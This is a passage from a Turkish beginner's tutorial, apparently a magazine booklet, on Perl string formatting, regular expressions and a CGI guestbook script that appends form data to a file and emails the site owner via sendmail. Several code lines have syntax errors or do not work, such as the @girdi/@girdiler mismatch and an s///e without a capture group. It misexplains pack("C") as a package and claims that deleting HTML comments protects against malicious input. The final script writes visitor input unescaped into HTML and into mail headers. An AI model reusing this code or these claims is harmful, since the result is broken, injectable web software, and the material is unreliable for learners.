1. Biçim argümanının başladığını belirten yüzde (%) işareti

2. İşaret: Biçim argümanı beş ayrı işaret alabilir:

+ Yazılan String’in önünde artı (+) veya eksi (+) işareti olmasını sağlar

- String’in sola hizalanmasını sağlar

0 Sayının soluna boşluk değil sıfır konulmasını sağlar

\# Heksadesimal sayılarda sola 0x veya 0X; Octal sayılarda sayıdan önce 0 konmasını sağlar.

boşluk Pozitif sayıların önüne bir aralık konarak, negatif sayılarla hizalanmasını sağlar.

3. Çıktı alanının asgarî boyutu.

4. Çıktının kaç basamaklı olacağı: bir nokta bir sayı ile yazılır.

4. Çıktı alanının türü. 15 çıktı alanı türü tanımlanabilir.

s String

d Integer, tam sayı

f Real, gerçek sayı

g Campact Real, sıkıştırılmış gerçek sayı

u Unsigned integer, işaretlenmemiş tam sayı

x Hexadecimal sayı (16-tabanlı, küçük harfle)

X Hexadecimal sayı (16-tabanlı, büyük harfle)

o Octal (8-tabanlı)

e Scientific notation (10’un kuvveti olarak yazılmış sayı, küçük harf)

E Scientifc notation (10’un kuvveti olarak yazılmış sayı, büyük harf)

c Single character (8-bit’lik karakter, değer olarak)

ld Long integer (32-bit’lik tam sayı)

lu Long unsigned integer (32 bit(lik işaretlenmemiş tam sayı)

lx Long hexadecimal (32-bit’lik 16-tabanlı sayı)

lo Long octal (32-bit’lik 8-tabanlı sayı)

Perl ile String biçimlendirmek kolay değildir. Perl’ün çeşitli işletim sistemleri için geliştirilmesi işini sürdüren kurum ve kuruluşların sitelerinde örnek String’ler ve sayılar üzerinde biçimlendirmenin hasıl yapıldığını gösteren Perl programları vardır. Bu dosyalar örnek olarak kullanılabilir. Bu kitapçığın örnek kodları arasında bulacağınız bicim.pl dosyasını çalıştırarak, biçimlendirme argümanlarının nasıl kullanıldığını inceleyebilirsiniz. Bu programda “PCWorld” String’ine, 5.242984 ve 2553 sayılarına değişik biçimlendirme argümanları ile verdiğimiz farklı şekilleri burada görüyorsunuz:

<cgi-perl015.tif>

Örneğin, “PCWorld” String’inin “PCW” olarak biçimlendirilmesi için şu programı verebilirsiniz:

$Metin1 = “PCWorld”;

printf(“%.3s\\n”, $Metin1);

////////////////////////////KUTU BİTTİ//////////////////////

Yukarıdaki sayı dizinin sağa hizalanmış olarak yazılmasını sağlamak için printf() fonksiyonunu şöyle yazabiliriz:

open (CIKTI, ‘>yazilan\_dosya.txt)’;

for ($i = 998; $i < 1102; $i += 1) {

printf(CIKTI “%4d, $i\\n”;

}

Bu komutla rakamlarımıza asgarî dört basamaklı yer ayırtıyoruz ve tam sayı olarak yazadırıyoruz. Bu programla Perl, bütün rakamlarınızı sağa hizalayacaktır.

//////////////////KUTU///////////////////////////////

**Yazdırmış olsa idik!**

Perl’ün sprintf() fonksiyonu aynen printf() gibi çalışır; fakat dosyaya veya ekrana yazdıracağı veriyi istediğiniz bir değişkene değer yapmak üzere bize getirir.

$degisken = sprintf(“%4d, $i\\n”);

deyimi ile tıpkı dosyaya yazılacak olan satırı $degisken’in değeri yapabiliriz.

//////////////////////////KUTU BİTTİ//////////////////////////

**Dosyaya Ek Yapalım**

Perl açısından bir dosyaya yazmakla, bir dosyanın sonuna metin eklemek arasında yapacağımız işlemler açısından hiç bir fark yoktur; sadece dosyanın açılışında fark vardır. Fakat bu çok önemli fark: Yazmak için açtığınız dosya varsa, varolan içeriği tümüyle değiştirilir; eklemek için açtığınız dosya yoksa oluşturulur; varsa yazdırmak istediğiniz metin en sona eklenir. Burada tekrar edelim:

Yazmak için dosya açma fonksiyonu:

open (YAZ, “>yazilacak\_dosya.txt”);

Eklemek için dosya açma fonksiyonu:

open (EKLE, “>>eklenecek\_dosya.txt”);

Bir kere daha vurgularsak, yazmak için dosya adının önünde tek büyüktür (>) işareti, eklemek için iki büyüktür (>>) işareti kullanıyoruz. Bu minicik işaretin işlevi arasındaki fark; aylardır biriktirdiğiniz ziyaretçi defteri girdilerinin tümünün silinip, yerine son ziyaretçinin girdilerinin yazılması olabilir!

**Gerçek Form.. Gerçek Perl**

Eh, artık Perl ile bir Form’daki bilgileri alıp, bir dosyaya yazdıracak düzeye geldik. Şimdi Web sitemize bir konuk defteri koyalım; bunun derleyeceği bilgileri ziyaretçiye onaylattırdıktan sonra bir dosyaya eklettirelim. Son bölümde, gerçek CGI ortamının kurallarını biraz daha yakından tanıdıktan sonra Perl programımıza, bize, bir ziyaretçinin daha konuk defterini doldurduğunu belirten bir elektronik mektup göndermesini öngören küçük bir bölüm daha ekleyeceğiz,

Kitapçığın baş tarafında “Sizi tanıyabilir miyiz?” başlıklı bir form yapmıştık ve bunu form.htm adıyla kaydetmiştik. Şimdi o dosyayı Form’un ACTION hanesine yazdığımız Perl programının adını değiştirmek amacıyla açın. Hatırlayacaksınız, o Form için yazdığımız Perl programı sadece Form’daki bilgileri Standart Girdi (STDIN) yoluyla okuyor ve bunları Browser penceresinde görüntülüyordu. Form’un ACTION hanesini şöyle değiştirin ve dosyası form2.htm adıyla kaydedin.

Aşağıda kısa bir şekilde Perl’de arama-bulma-değiştirme işlemlerine değineceğiz. Bu bölümde yer alan alıştırmalardan sonra forn\_analiz.pl’i açın ve form\_islem.pl adıyla kaydedin; birazdan bu programın içeriğini değiştereceğiz. Önce, gözden geçirmeyi elimizde işlenecek bir metin oluncaya kadar geri bıraktığımız bir iki metin arama-değiştirme fonksiyonunu ele alalım.

**Bul-Değiştir**

Başkasının yazdığı metinlerde noktalama işaretlerinden sonra boşluk bırakılmamış olmasına kızar mısınız? Ben de! Perl ile metin düzenleme fonksiyonlarından geriye bıraktığımız ikisi, vereceğimiz bir String modelini (pattern) metinde arayan ve bulduklarını değiştiren fonksiyonlarla, Perl’e okuttuğumuz metinlerde sadece yazım kurallarını uygulatmakla kalmayız, fakat Form bilgisi içinde sitemizin güvenliğini sarsıcı metin olup olmadığını tarayabiliriz; gereksiz karakterleri, örneğin yeni satır başlatan kodları atabiliriz.

Perl’ün içinde arama işlemi de bulunan split() fonksiyonunu daha önce görmüştük. Bu fonksiyona, arayacağı nesneyi iki bölü işareti (//) arasında veriyorduk; hangi değişkende aramay yapılmasını istediğimizi bildiriyorduk; elde ettiği sonuçları yeni bir değişkene yazmasını istiyorduk. Örneğin:

@Yeni\_degisken = split(/\\&/, $Aranan\_degisken);

Bu deyimle, Perl, $Aranan\_degisken adlı değişkenin içinde, & işaretlerini bulur ve değişkeni & işaretlerinden parçalara böler; elde ettiği her bir parçayı @Yeni\_değişken adlı değişkenin elemanları olarak yazar.

Perl’ün arama-bulma işi yapan bir diğer işlemcisi benzerini-bul (match) “m//” operatörüdür. Dikkat ederseniz fonksiyon değil, operatör (işlem) diyoruz. Çünkü, bu işlem tek başına değil, Perl bir diğer işlemi, “bağdaştırma/bağlama işlemi” (binding operator) dediğimiz =~ işareti ile birlikte kullanılır ve bize doğru/yanlış sonucunu verir. Bağlama işareti, solunda değerin içinde sağındaki “modelin” bulunup bulunmadığını bildir. Burada sağdaki model m// ile belirtilir. Örnek yapalım, bu karmaşık ifade anlaşılır hale gelecektir:

if(“dostlar#neredesiniz” =~ m/#/)

{print “Aranan bulundu\\n” } else {print “Aranan bulunamadı\\n” }

Ekrana “Aranan bulundu” yazdıracaktır. (“dostlar#reredesiniz” String’i yerine isterseniz bir değişken adı da koyabilirsiniz; arama değişkenin içerdiği değerde yapılır.) Buradaki “if” doğru/yanlış sonucu veren bir operatör doğru sonuç verdiği zaman birinci işlemi, yanlış sonuç verdiği zaman ikinci işlemi yapacaktır. Arama sonucu arananın benzeri bulunamazsa, sonucun yanlış değil doğru olması için bağlama operatörünü !~ olarak yazabiliriz. Örnek:

if(“dostlar#neredesiniz” !~ m/#/)

{print “Aranan bulunamadı\\n” } else {print “Aranan bulundu\\n” }

Metinlerinizde, Perl için özen anlamı olan şu karakterleri aratmak istiyorsanız, iki bölü işaretinin arasına bu karakteri yazarken önüne ters-bölü işareti koymanız gerekir:

^ $ + \* ? . | ( ) { } \[ \] \\ /

Bir metinde iki karakterden biri veya diğerini aratacağınız zaman veya anlamına gelen dik çizgi (|) işaretini kullanmanız gerekir. örneğin, Perl aranan metinde “h” veya “H” harfini arasın istiyorsak, bunu şöyle yazabiliriz:

if($aranan\_metin =~ m/(h|)/)..

m// operatörü ile joker karakterler de kullanabilirsiniz:

if($aranan\_metin =~ m/T.K/)..

Perl, TEK, TAK, TÜK kelimelerini bulacak fakat mesela TANK kelimesini bulmayacaktır; çünkü bir adet nokta işareti ile verdiğiniz iki karakterin arasında sadece bir adet karakter bulunmasına izin verdiniz. Perl’de aranan modeli belirtmek için bir çok başka yöntem vardır. Örneğin verdiğiniz modelin bulunmasını değil, bulunmamasını istiyorsanız, önüne ^ işareti koyabilirsiniz. Bir başka örnek, bütün bir sınıfı belirtmek amacıyla aranan modeli köşeli parantez içine almak veya dizileri, 0-9, A-Z, a-z gibi kesme işaretiyle belirtmek olabilir. Fakat bunların çoğunun kısayolu da vardır:

**Kısayol Açık şekli Anlamı**

\\d \[0-9\] Herhangi bir rakam

\\w \[a-zA-Z\_0--\] Herhangi bir alfanümerik karakter

\\s \[\\t\\n\\r\\f\] Herhangi bir yazılmaz karakter

\\D \[^0-9\] Rakam olmayan bir karakter

\\W \[^a-zA-Z\_0--\] Alfanümerik olmayan bir karakter

\\S \[^\\t\\n\\r\\f\] Yazılmaz olmayan bir karakter

Bu kısayolların kullanımına bir örnek verirsek:

if($aranan\_metin =~ m/\\d/)..

deyimi ile metinde herhangi bir rakam bulunup bulunmadığını aratabilirsiniz. Kısayollar ve normal ifadeler birlikte kullanılarak, Perl’ün arama yeteneği genişletilebilir.

Bazen arattığımız karakter(ler)in metindeki yeri bizim için önem taşıyabilir. ^ işareti vereceğimiz karakterlerin aranan metnin başında, $ işareti de sonunda olmasına dikkat edilmesini sağlar. Örnek, aradığımız metni “Mus” harfleriyle başlamasını istiyorsak:

if($aranan\_metin =~ m/^Mus)..

Aranan metnin “afa” ile bitmesini istiyorsak:

if($aranan\_metin =~ m/afa$)..

Bu noktada eğer temizlemediyseniz, bir dosyadan okuttuğunuz metnin sonunda yeni satır karakteri bulunabileceğini hesaba katmalısınız. Perl’ün aranan karakterin kaç adet olması gerektiğini belirleyebilmemizi sağlayan kısayollar vardır:

**Kısayol Anlamı**

+ En az 1 kere veya daha fazla

\* En az 0 kere veya daha fazla

? 0 veya 1 kere

{x} Kesinlikle x kere

{x,} En az x kere

{x,y} En az x, en çok y kere

Bu kısayollar da diğer normal ifadeler ve kısa yollarla birlikte kullanılabilir. Örneğin, “H ile başlayan ve I ile biten ve arasında bir veya daha fazla herhangi bir karakter bulunan metinleri bul!” demek istiyorsanız, şu deyimi yazmalısınız:

if($aranan\_metin =~ m/H.+I)..

Bu deyimle, HAKKI ve HALI bulunur, fakat HI bulunamaz.

Aradığımızı bulduk, diyelim. Elde ettiğimiz sonuç aranan bulunursa doğru (True), bulunamazsa yanlış (False) değerinden başka bir şey değil. Peki, içinde aradığımız değer bulunan String’i veya sayıyı öğrenemez miyiz? Öğreniriz. Perl bulduklarını sırayla $1, $2, $2 adlı değişkenlere yazar. Örnek:

$Metin1 = “HAKKI”;

if($Metin1 =~ m/(H.)K(.I)/)

{print “Bulundu\\n” } else {print “Bulunmadı\\n” }

print “$1\\n$2\\n”;

Prel’ün aradığı metnin büyük-harf veya küçük-harf olmasına aldırış etmemesini istiyorsak, m// işleminden sonra i (ignore) harfini koyarız. Arattığımızı arama yapılan metinde bütün geçtiği yerlerde bulmasını istiyorsak, yani arama yapılan metnin tümünün aranmasını arzu ediyorsak, m// operatöründen sonra g (global) harfini koyarız.

Peki, aradığımızın sadece bulunup bulunmadığını ve ne bulunduğunu öğrenmek istemiyoruz; fakat aradığımız şeyi değiştirmenizi istiyorsak! Bunu s/// işlemine (substitute, yerine koy) ile yaparız. Çalışma ilkesi tamamen m// işlemkine benzeyen s///, ikinci ve üçüncü bölü işaretleri arasına koyacağımız şeyleri, bulduklarının yerine koyar.

Sözgelimi elimizdeki metinde geçen bütün + işaretlerini boşluk (aralık) ile değiştirmek istiyoruz:

$Bosluklu\_degisken = ($Artili\_degisken =~s/\\+/ /);

s/// işleminin de işleyişini değiştiren bir çok eki vardır. Bundan e (evaluate, değerlendir), eğer bulunan unsurun yerine konulan unsur bir hesap veya bir değişken içeriyorsa, bu değerlendirmenin yapılmasını sağlar.

$yeni\_degisken =~ s/\\d+/$1 + 1/e;

Perl, bu deyimle, bulduğu unsur diyelim ki 135 ise, anında 136 yapar.

Her ne kadar kullanışlı olsa da, s/// işlemi sadece bir unsuru bir başka unsura çevirdiği için, bazen yetersiz kalabilir. Bize bütün değişkende, söz gelimi bütün büyük harfleri küçük harf yapacak, bir işlemci gerekebilir. Bu işlemci, tr/// operatörüdür. Ve işte arzu ettiğimiz büyük harf-küçük harf değişlikliğini yapma deyimi:

$yeni\_degisken =~ tr/A-Z/a-z/;

Bu işlemin işleyiş tarzını ve sonuçlarını, üç şekilde değiştirebiliriz:

c: seçilmeyenleri değiştir:

$yeni\_degisken =~ tr/0-9/ /c;

Bu deyim, rakam olmayan herşeyin yerine boşluk koyar.

d: değiştirme, sil:

$yeni\_degisken =~ tr/0-9//cd;

Bu deyim, rakam olmayan herşeyi siler.

s: tekrar edenleri teke düşür:

$yeni\_degisken =~ tr/,/,/s;

Bu deyim, yanyana birden fazla virgülü tek virgül haline getirir.

**Form’dan gelen bilgilerde arama-bulma-değiştirme**

Perl’de arama-bulma-değiştirme işlemlerini gözden geçirmeyi de tamamladıktan sonra, bir Form’dan gelen veriyi istediğimiz biçimde kullanılır hale getirmek için herşeyi öğrenmiş olduk. Şimdi forn\_analiz.pl’i açın ve form\_islem.pl adıyla kaydedin; ve programın baş tarafındaki şu deyimlere bakın:

**................**

** @girdiler = split(/&/, $ENV{'QUERY\_STRING'});**

**................**

** @girdi = split(/&/, $depo);**

**................**

** ($anahtar, $deger) = split (/=/, $girdi);**

** $anahtar =~ tr/+/ /;**

** $deger =~ s/%(\[a-fA-F0-9\]\[a-fA-F0-9\])/pack("C", hex($1))/eg;**

** $deger =~ tr/+/ /;**

** $deger =~ s/%(\[a-fA-F0-9\]\[a-fA-F0-9\])/pack("C", hex($1))/eg;**

** $deger =~s/<!--(.|\\n)\*-->//g;**

**................******

Bu programı yazdığımızda içinde anlamadığımız şeyler bulunduğunu belirtmiştik; şimdi anlaşılmayan bir taraf kalmamış olsa gerek. Browser’ın yumak yapıp yolladığı Form bilgilerini içine yazdığımız $depo adlı değişkenin değerini & işaretinden bölümlere ayırdığımızı, ortaya çıkan bütün parçaları, @girdi dizisinin elemanları haline getirdiğimi ve sonra bu dizinin her bir satırını bu kez eşittir işaretinden bölüp, ortaya çıkan Stringleri bu kez %formveri adlı Bağlantılı Dizi (Hash) değişkenin anahtar/veri çiftleri olarak kaydettiğimi görüyorsunuz.

Şimdi bu işlemin arasında, hem anahtar adı olacak String’de, hem de değer olacak String’de önce + işaretlerini boşlukla değiştirdiğimizi; sonra biraz karışıkça bir deyimle, s/// işlemi yaptırdığımızı görüyorsunuz:

=~ s/%(\[a-fA-F0-9\]\[a-fA-F0-9\])/pack("C", hex($1))/eg;

Aslında bu s/// işleminin arama bölümünü biliyoruz: “değeri a-f veya A-F ve 0-9 arasında olan iki basamaklı ve % ile başlayan herşeyi bul.” Fakat bulunan şeyin yerine konacak değer yabancı. Perl’ün paket denilen haricî araçlar dosyaları (externel utilities files) vardır. Bu paketler (modüller) Perl ile birlikte kurulur ve Perl programlarınızı çalıştıran Perl Programı tarafından tanınır. Burada gönderme yaptığımız “C” paketi 16 tabanlı sayı sistemiyle yazılmış kodların ASCII, ANSI ve Unicode karşılıklarını verir.

Yukarıdaki örnekte yer alan son s/// işlemi Web Form verisi yoluyla sitenize zararlı program kodu yollamak isteyebileceklere karşı alınmış bir önlemdir. Kötüniyetli kişi HTTP Server’a zararlı programları “<!---“ ve “-” işaretleri arasında yollamak zorundadır. Bu işlemle bu tür girdileri tümüyle yok ediyoruz.

Bu örnekte gördüğünüz tr/// ve s/// işlemlerini içeren deyimler, neredeyse bütün dünyada standart olarak kullanılır. Form işleme programında da bu bölümü aynen bırakacağız.

Yapacağımız ilk değişiklik, ekrana gönderdiğimiz değişiklikleri bu kez bir dosyaya göndermek olacağı için Perl programına geçmeden önce bu dosya ile ilgili hazırlıklar yapalım. Bu dosyada, ziyaretçilerimizden gelen bütün Form bilgileri belirli bir biçimde yazılması gerekir, ki sonra bu dosyayı Web Sitemize evsahipliği yapan bilgiyardan kendi bilgisayarımıza çekerek, inceleyebilelim, ziyaretçilerimiz hakkında fikir edinelim. Bu dosyadaki bilgilerin, Form’daki Input alanlarını sütun olarak düşünerek kaydedilmesi uygun olur. Bunun için önce içine Form bilgilerinin ekleneceği düzyazı dosyasını oluşturabiliriz, birinci satır olarak sütun başlıklarını yazabiliriz. Örneğin şöyle:

Adı Adres Kod Merak e-posta mesaj eğitim

Burada sütun başlıklarından sonraki ok işaretleri kelimelerin arasına sekme (Tab) koyduğumuzu gösteriyor. Form bilgilerimizi de değişken değerlerinin arasına sekme koyarak yazacağız. Şimdi bu dosyayı form\_bilgileri.txt adıyla kaydedin. İsterseniz bu dosyayı daha sonra düzyazı programıyla değil bir veritabanı programı ile açabilirsiniz; sekme ile ayrılan metinler sütun haline dönüştürülür. (Bu alıştırmayı birlikte yapıyorsak, “eğitim” kelimesinden sonra Enter tuşuna basarak yeni satır (newline) kodu girmeyi unutmayın!)

Eğer hala yapmadıysanız, şimdi form\_analiz.pl dosyasını düz yazı programınızda açın ve form\_islem.pl adıyla kaydedin. Bu programın yaptığı iki iş var: (1) Form’dan gelen bilgileri %formveri değişkenine, Input alan adları anahtar, ziyaretçinin bu alana yazdıkları değer olarak şekilde yerleştirmek; sonra bir dizi print() fonksiyonu ile bunları ekranda görüntülemek. Yukarıda görmüştük ki, ekrana “yazdırmak” ile dosyaya “yazdırmak” arasında sadece bir dosya tutamağı farkı vardı. Hatırlarsak, dosya tutamağı (handle) dediğimiz şey, dosyayı açtığımız sırada verdiğimiz keyfî bir kelimeden ibaretti.

Demek ki önce Perl’e, biraz önce oluşturduğumuz ve Web sitemizde form\_isleme.pl programının bulunduğu dizine gönderdiğimiz dosyayı ek yapılmak üzere açalım. (Şimdilik bu dosyayı kişisel Web Server’da Perl program dosyalarınızın durduğu dizine kopyalamakla yetineceğiz; fakat gerçek CGI yönetimi ile ilgili bilgileri ve bu dosyayı FTP ile HTTP Server’ına göndermeyi bundan sonraki bölümde ele alacağız.)

open (EKLE, “>>form\_bilgileri.txt”);

Bu deyimle, biraz önce oluşturduğumuz ve tek satırlık sütun başlıklarımızı eklediğimiz metin dosyasını ek yapmak amacıyla açıyoruz; ve bu dosyaya EKLE tutamağını (Handle) veriyoruz.

Şimdi artık, Form’dan gelen bilgileri (%formveri değişkenindeki değerleri) bu dosyaya kaydedebiliriz. Fakat bu noktada dikkatinizi bir duruma çekmek istiyorum. Elimizi alıştırmak amacıyla yazdığımız için bu form\_analiz.pl programında ziyaretçiden gelen verileri içeriklerine çok dikkat etmeden, tümüyle işledik ve ve “herşeyi” ekrana gönderdik. Bu arada Form etiketinin otomatik olarak gönderdiği “Gonder” düğmesinin (aslında düğmenin üzerine yazılan metinden başka bir şey olmayan) değeri de %formveri değişkeninde “Gonder” anahtarına “Gönder” değeriylle kaydedildi. Acaba, hiç bir işimize yaramayacak bu bilgi dosyaya kaydettirmemek mümkün müdür? Tabiî. Şu anda ekrana “yazma” işini yapan print() fonksiyonunun nasıl işlediğini hatırlayalım:

foreach $anahtar (sort keys(%formveri)) {

print "<P><B>$anahtar</B> alanına <B>$formveri{$anahtar} </B>değeri girildi.";

}

%formveri değişkeninin her bir anahtarı için, ekrana anahtar adı ile “alanına” kelimesini, anahtarın değerini ve “değeri girildi” kelimelerini yazdırıyoruz. Yazdırdığımız anahtarın “Gonder” değerine eşit olması halinde bu yazma işlemini yaptırmayabiliriz. Veya, tersini:

foreach $anahtar (sort keys(%formveri)) {

if ($anahtar ne “Gonder”) {

print "<P><B>$anahtar</B> alanına <B>$formveri{$anahtar} </B>değeri girildi.";

}

}

Perl, print() fonksiyonunu ancak ve sadece elindeki anahtarın “Gonder” olmaması (ne, Stringler için eşit değilse anlamına gelir) halinde icra edecektir. (Aynı amacı başka yöntemlerle de sağlayabiliriz. Gönder düğmesinin oluşturduğu değeri %formveri değişkenine yazdırmamayı başarabilir misiniz?)

Peki, Gönder düğmesinin değerini yazdırmamayı başardık; fakat oluşturmak istediğimiz form bilgileri dosyasında anahtar adlarına ihtiyacımız var mı? Anahtarları sütun başlığı olarak dosyaya yazdık; şimdi artık ziyaretçilerin verdiği bilgileri işlerken anahtarları değiş sadece değerleri, aralarına sekme (Tab) işareti koyarak yazdırabiliriz. Bunu mevcut kodda uygulayalım:

foreach $anahtar (sort keys(%formveri)) {

if ($anahtar ne “Gonder”) {

print EKLE "$formveri{$anahtar}\\t";

}

}

print EKLE "\\n";

Burada EKLE tutamağı ile tanınan açık dosyaya (form\_bilgileri.txt) sadece %formveri ilişkili değişkeninde sırasıyla bütün anahtarların değerlerini, bir sekme (Tab) işaretiyle yazdırıyoruz. Bir ziyaretçinin form bilgilerinin işlenmesi bittiğinde, yani bu ziyaretçiye ait son veri de yazdırıldıktan sonra, satırın sonuna yenisatır (newline) işaretini yazdırıyoruz, ku böylece bir bayşka ziyaretçi için bu dosyaya ek yapılırken, yeni bilgiler yeni bir satırdan başlayabilsin.

Böylece ziyaretçiden aldığımız bilgileri işlediğimiz dosya ile işimiz tamamlanmış oluyor; açtığımız dosyayı kapatabiliriz:

close (EKLE);

Bu arada, ziyaretçimize bir teşekkür mesajı vermeyi unutmalayım. Bunu, ziyaretçinin bilgisayarına HTML kodlarıyla mesajımızı yazdırarak yapabiliriz.

Teşekkür bölümüyle birlikte form\_isleme.pl şu şekli almış oluyor:

**#!/usr/local/bin/perl**

**#form\_islem.pl**

**if ($ENV{'REQUEST\_METHOD'} eq 'GET') {**

** @girdiler = split(/&/, $ENV{'QUERY\_STRING'});**

**} elsif ($ENV{'REQUEST\_METHOD'} eq 'POST') {**

** read (STDIN, $depo, $ENV{'CONTENT\_LENGTH'});**

** @girdi = split(/&/, $depo);**

**} else {**

** print "Content-type: text/html\\n\\n";**

** print "<P>Formda bir hata var!";**

**}**

**foreach $girdi (@girdiler) {**

** ($anahtar, $deger) = split (/=/, $girdi);**

** $anahtar =~ tr/+/ /;**

** $deger =~ s/%(\[a-fA-F0-9\]\[a-fA-F0-9\])/pack("C", hex($1))/eg;**

** $deger =~ tr/+/ /;**

** $deger =~ s/%(\[a-fA-F0-9\]\[a-fA-F0-9\])/pack("C", hex($1))/eg;**

** $deger =~s/<!--(.|\\n)\*-->//g;**

** if ($formveri{$anahtar}) {**

** $formveri{$anahtar} .= ", $deger";**

** } else {**

** $formveri{$anahtar} = $deger;**

** }**

**}**

**#dosya ekleme bölümü**

**open (EKLE, “>>form\_bilgileri.txt”);**

**foreach $anahtar (sort keys(%formveri)) {**

** if ($anahtar ne “Gonder”) {**

** print EKLE "$formveri{$anahtar}\\t";**

** }**

** }**

**print EKLE "\\n";**

**close(EKLE);**

**#teşekkür bölümü**

**print "Content-type: text/html\\n\\n";**

**print "<meta http-equiv=\\"content-type\\" content=\\"text/html; charset=ISO-8859-9\\">\\n";**

**print "<meta http-equiv=\\"Content-Type\\" content=\\"text/html; charset=windows-1254\\">\\n";**

**print "<H3><CENTER>Teşekkürler</CENTER></H3>\\n";**

**print "<P>Sayın $formveri{Adi}\\n";**

**print "<BR>$formveri{Adres} $formveri{Kod}\\n";**

**print "<P>Sitemizi ziyaret ettiğiniz ve formumuzu doldurduğunuz için size teşekkür ederiz!\\n";**

**print "<BR>Size $formveri{Merak} alanında daha iyi hizmet etmek için çaba göstereceğiz.\\n";**

**print "<BR>Adýnýzý ve<B> $formveri{eposta} </B>şeklindeki elektronik adresinizi tanesi 250 bine kimseye satmayacağımıza söz veriyoruz.\\n";**

**print "<P>Ana sayfamıza geri dönmek için burayı <A HREF=\\"index.htm\\">tıklayınız</A>.\\n";******

İşte bu kadar! Ziyaretçinizden sitenizdeki bir Form’a yazdığı ve size gönderdiği bilgileri bir dosyaya eklettirmeyi başarmış bulunuyorsunuz. Bu dosyadaki bilgilerle ziyaretçilerinizi daha yakından tanımak, sitenizi bırakılan mesajlar doğrultusunda zenginleştirmek, ve sitende yaptığınız güncelleştirmeleri derlediğiniz elektronik posta adreslerine düzenli şekilde bildirmek size kalmış bulunuyor.

Fakat bir durum var: Ziyaretçi özene-bezene formu doldurdu; Perl büyük bir beceriyle, bu bilgileri dosyaya ekledi. Bizim Site sahibi olarak bu durumdan haberimiz olması gerekmiyor mu? Veya başka bir deyişle Perl programımızın bu durumu bir elektronik mesajla bize bildiresini istiyoruz.

Bunun için bütün yapacağımız iş, form\_islem.pl programında teşekkür bölümünden önce, bir e-posta yollama bölümü koymaktan ibaret. HTTP Server, CGI’dan aldığı talep üzerine, kendi bulunduğu bilgisayardaki programları çalıştırabilir. Bu programlar arasında elektronik mesaj gönderme programı olan “sendmail” vardır. Web Server programlarının elektronik mesaj gönderme programları farklı olabilir; sizin site yönetmeni olarak kullanabileceğiniz elektronik posta gönderme programının adını ve adresini, Web Server yönetimi verebilir. Ücretsiz Web sitesi hizmeti veren şirketler genellikle CGI programı çalıştırmaya ve elektronik mesaj göndermeye izin vermezler. Eğer Web sitenize evsahipliği yapan firma CGI ve elektronik posta gönderme desteği veriyorsa muhtemelen bunun için gerekli FORM/ACTION bilgisini de size verecektir. Bu tür bilgiler genellikle evsahibi firmanın sıkça sorulan sorular belgelerinde de bulunabilir. Unix tabanlı Server’larda hemen hemen daima elektronik mektup gönderme işlemi “sendmail” programı ile yapılır ve bu program “/usr/sbin/” veya “/usr/lib/” dizininde bulunur.

CGI programımızla HTTP Server’a bir programı çalıştırması için komut göndermekle, bir dosyayı yazmak-okumak-eklemek için açtırtmak arasında fark yoktur; bu işlemi de “open() fonksiyonu ile yaparız. Örneğin:

open(MEKTUP, "|/usr/sbin/sendmail -t $kime") || die ("sendmail programını bulamıyorum");

Burada dikkat edeceğiniz nokta, open() fonksiyonunu dosya açtırmada kullandığımızdan farklı olarak programın yolu ve adından önce pipe (|) simgesini kullanmış olmamızdır. Bu Unix sistemlerinde HTTP Server’ın başka bir programı çağırdığımızı anlamasını sağlar. Yukarıdaki örnek kodda, “#teşekkür bölümü” satırının üstüne şu kodları girin: ($kime değişkeninin karşısına isim yerine e-posta adınızı ve adres.com yerine de elektronik posta adresinizi yazmanız gerekir. Örnek olarak, bu kodu ben yazıyor olsa idim, bu satırı şöyle yazmam gerekirdi: $kime = "hocal\\@pcworld.com.tr ";)

**# e-posta yollama bölümü**

**$kime = "isim\\@adres.com";**

**open(MEKTUP, "|/usr/sbin/sendmail -t $kime") || die ("sendmail programını bulamıyorum");**

** print MEKTUP "Kimden: $formveri{'eposta'}\\n";**

** print MEKTUP "Kime: $kime\\n";**

** print MEKTUP "Konu: Ziyaretçi Formu\\n\\n";**

** print MEKTUP "Adı: $formveri{'adi'}\\n";**

** print MEKTUP "E-Posta: $formveri{'eposta'}\\n";**

** print MEKTUP "İlgi alanı: $formveri{'Merak'}\\n";**

** print MEKTUP "Eğitim Düzeyi: $formveri{'egitim'}\\n";**

** print MEKTUP "Mesaj: $formveri{'mesaj'}\\n";**

** close(MEKTUP);**

Bu ekibi yaptıktan sonra CGI programınız önce size bir ziyaretçinin daha sitenizdeki Form’u doldurduğunu bildirecek, daha sonra ziyaretçiye teşekkür edecektir.

Burada yerimiz olmadığı için ayarıntılı olarak inceleyemediğimiz bir diğer konuk defteri-mesaj gönderme Formu örneğini bu kitapçığın malzemesini içeren Zip dos eposta.htm ve eposta.pl adıyla bulabilirsiniz. Özellikle bir Form’un doğru ve eksiksiz doldurulup doldurulmadığını denetleyen bölümleri bakımından bu Perl programı örnek olabilir.

Böylece, CGI amacıyla işimize yarayacak ölçüde Perl’e başlangğıç yapmış olduk. Bu bizi Perl uzmanı yapmıyor. Ama artık hiç olmazsa, HTML Form’larımız için gerekli CGI programını yazabiliriz. CGI konusunda buraya kadar değinmediğimiz fakat bir Web tasarımcısının bilmesi gereken noktaları son bölümde bulabilirsiniz.

## **CGI’da Yaşam**

CGI programı ve Perl öğrenme zorunluğu bir çoğumuz için Web sitemizdeki Form’lara ziyaretçilerimizin yazdıkları metinleri almak, saklamak ve kullanmak amacından kaynaklanıyor. Bu kitapçığın başında yaptığımız gibi kendi bilgisayarımıza kişisel Web Server kurmak ve Perl’ü bu Server’da işler hale getirmek, belki Perl programlarımızı sınamak açısından gerekli; fakat gerçek bir Web Server’da CGI programı çalıştırmaktan çok kolay bir işlemdir.

Gerçek Internet’te HTTP Server olarak çalışan bilgisayarlarda güvenlik büyük bir öncelik taşır. CGI programlarımızı gerçek bir Web Server’da çalıştırabilmek için sadece CGI ve Perl bilgisine değil, fakat gerçek hayatta geçerli CGI uygulamalarındaki ilkeleri, kuralları ve hatta gelenekleri öğrenmek zorundayız. CGI yoluyla sitemize evsahipliği yapan Web Server’ın bir çok dosya işlemi ve elektronik mesaj gönderme hizmeti yapmasını sağlayabiliriz. Bunun için Server’ları ve Web sitemize ev sahipliği yapan bilgisayarın işletim sistemini biraz daha yakından tanımak zorundayız.

**CGI, Web Server’a Bağımlıdır**

